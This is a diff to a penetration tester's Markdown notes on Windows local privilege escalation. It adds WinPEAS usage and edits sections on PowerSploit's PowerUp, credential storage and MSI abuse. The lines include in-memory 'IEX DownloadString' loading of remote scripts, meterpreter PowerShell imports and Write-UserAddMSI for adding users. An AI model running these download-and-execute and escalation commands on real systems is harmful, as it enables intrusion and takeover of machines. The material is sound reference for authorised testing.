@@ -209,12 +209,12 @@ For more information about `AppLocker`, refer to the
 
 Most of the enumeration process detailed below can be automated using scripts.
 
-*Personal preference: PowerSploit's `PowerUp.ps1` `Invoke-PrivescAudit` /
-`Invoke-AllChecks` + enjoiz's `privesc.bat` or `privesc.ps1` + off-target
+*Personal preference: PEASS's `WinPEAS.exe` or `WinPEAS.bat` + PowerSploit's
+`PowerUp.ps1` `Invoke-PrivescAudit` / `Invoke-AllChecks` + off-target
 `Windows Exploit Suggester - Next Generation`*
 
-To upload the scripts on the target, please refer to the [General] File transfer
-note.
+To upload the scripts on the target, please refer to the `[General] File
+transfer` note.
 
 Note that PowerShell scripts can be injected directly into memory using
 PowerShell `DownloadString` or through a `meterpreter` session:
@@ -226,8 +226,26 @@ PS> IEX (New-Object Net.WebClient).DownloadString('<URL_PS1>')
 PS> <Invoke-CMD>
 
 meterpreter> load powershell
-meterpreter> powershell_import <POWERUP_PS1_FILE_PATH>
+meterpreter> powershell_import <PS1_FILE_PATH>
 meterpreter> powershell_execute <Invoke-CMD>
+```
+
+###### Privilege Escalation Awesome Scripts SUITE (PEASS) - WinPEAS
+
+`WinPEAS` checks the local privilege escalation vectors defined in the
+following checklist:
+`https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation`.
+
+Note that the `winPEAS.exe` executable requires the .NET 4.0 framework to
+function. Alternatively, the `winPEAS.bat` script may be used instead (with no
+coloring support and less optimization).
+
+```
+# All checks with out resource throttling
+# Additionally specify "notcolor" to avoid formatting errors if ANSI coloring is not supported
+winPEAS.exe cmd searchall searchfast
+
+winPEAS.bat
 ```
 
 ###### PowerSploit's PowerUp
@@ -245,6 +263,9 @@ checks:
 The `Invoke-PrivescAudit` / `Invoke-AllChecks` cmdlets will run all the checks
 implemented by PowerSploit's `PowerUp.ps1`. The script can be either injected
 directly into memory as specified above or can be imported using the file.
+
+Note that `PowerUp` is not actively maintained in the master branch of the
+`PowerShellMafia`'s `PowerSploit` GitHub repository.
 
 ```
 # powershell.exe -nop -exec bypass
@@ -298,7 +319,7 @@ SeatBelt.exe all full
 ### Physical access privileges escalation
 
 Physical access open up different ways to bypass user login screen and obtain
-NT AUTHORITY\SYSTEM access.
+`NT AUTHORITY\SYSTEM` access.
 
 ###### Hardened system
 
@@ -451,11 +472,11 @@ accounts credentials, domain credentials, and generic credentials:
     and cached in the LSASS (Local Security Authority Subsystem) process.
   - Local accounts credentials are stored in the SAM (Security Account Manager)
     hive.
-  - Generic credentials are defined and authenticated by programs that manage
-    authorization and security directly. The generic credentials are cached in
-    the Credential Manager.
+  - Generic credentials are defined programs that manage authorization and
+    security directly. The generic credentials are cached in the Windows
+    Credential Manager.
 
-Local administrator or NT AUTHORITY\SYSTEM privileges are required to access
+Local administrator or `NT AUTHORITY\SYSTEM` privileges are required to access
 the clear-text or hashed passwords. Refer to the `[Windows] Post
 Exploitation` note for more information on how to retrieve these credentials.
 
@@ -832,9 +853,9 @@ msiexec /quiet /qn /i <MSI_PATH>
 
 # (PowerShell) PowerSploit's PowerUp Write-UserAddMSI
 # Prompt a GUI interface to specify the user to be added
-PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/Pow
+IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/Pow
 erSploit/master/Privesc/PowerUp.ps1")
-PS> Write-UserAddMSI
+Write-UserAddMSI
 ```
 
 ### Services misconfigurations
